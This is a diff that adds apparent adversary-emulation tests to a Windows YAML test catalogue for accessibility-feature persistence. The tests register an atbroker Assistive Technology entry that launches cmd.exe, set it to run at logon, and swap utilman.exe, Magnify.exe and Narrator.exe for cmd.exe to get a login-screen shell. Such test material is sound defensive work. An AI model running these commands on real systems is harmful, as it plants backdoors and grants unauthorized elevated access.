@@ -87,3 +87,85 @@ atomic_tests:
       icacls %windir%\system32\osk.exe /grant:r Administrators:RX
     name: command_prompt
     elevation_required: true
+- name: Atbroker.exe (AT) Executes Arbitrary Command via Registry Key
+  auto_generated_guid: 444ff124-4c83-4e28-8df6-6efd3ece6bd4
+  description: |
+    Executes code specified in the registry for a new AT (Assistive Technologies).
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+       reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
+       reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
+       reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
+       atbroker /start malware_test
+    cleanup_command: |
+       reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
+    name: command_prompt
+    elevation_required: true
+- name: Auto-start application on user logon
+  auto_generated_guid: 7125eba8-7b30-426b-9147-781d152be6fb
+  description: |
+    Executes code specified in the registry on new user logon session automatically by registration of new AT and modification of configuration value.
+    This test will register new AT named malware_test with code for cmd.exe and add a configuration value for the code to be run during user logon session.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+       reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
+       reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
+       reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
+       reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs" /v Configuration /t REG_SZ /d malware_test /f
+    cleanup_command: |
+       reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
+       reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs" /v Configuration /f
+    name: command_prompt
+    elevation_required: true
+- name: Replace utilman.exe (Ease of Access Binary) with cmd.exe
+  auto_generated_guid: 1db380da-3422-481d-a3c8-6d5770dba580
+  description: |
+    Replace utilman.exe (Ease of Access binary) with cmd.exe. This allows the user to launch an elevated command prompt by clicking the Ease of Access button on the login screen.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd )
+      takeown /F C:\Windows\System32\utilman.exe /A
+      icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t
+      copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+    cleanup_command: |
+      copy /Y C:\Windows\System32\utilman_backup.exe C:\Windows\System32\utilman.exe
+    name: command_prompt
+    elevation_required: true
+- name: Replace Magnify.exe (Magnifier binary) with cmd.exe
+  auto_generated_guid: 5e4fa70d-c789-470e-85e1-6992b92bb321
+  description: |
+    Replace Magnify.exe (Magnifier binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Magnifier from the Accessibility menu on the login screen.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd )
+      takeown /F C:\Windows\System32\Magnify.exe /A
+      icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t
+      copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe
+    cleanup_command: |
+      copy /Y C:\Windows\System32\Magnify_backup.exe C:\Windows\System32\Magnify.exe
+    name: command_prompt
+    elevation_required: true
+- name: Replace Narrator.exe (Narrator binary) with cmd.exe
+  auto_generated_guid: 2002f5ea-cd13-4c82-bf73-e46722e5dc5e
+  description: |
+    Replace Narrator.exe (Narrator binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Narrator button from the Accessibility menu on the login screen.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd )
+      takeown /F C:\Windows\System32\Narrator.exe /A
+      icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t
+      copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe
+    cleanup_command: |
+      copy /Y C:\Windows\System32\Narrator_backup.exe C:\Windows\System32\Narrator.exe
+    name: command_prompt
+    elevation_required: true
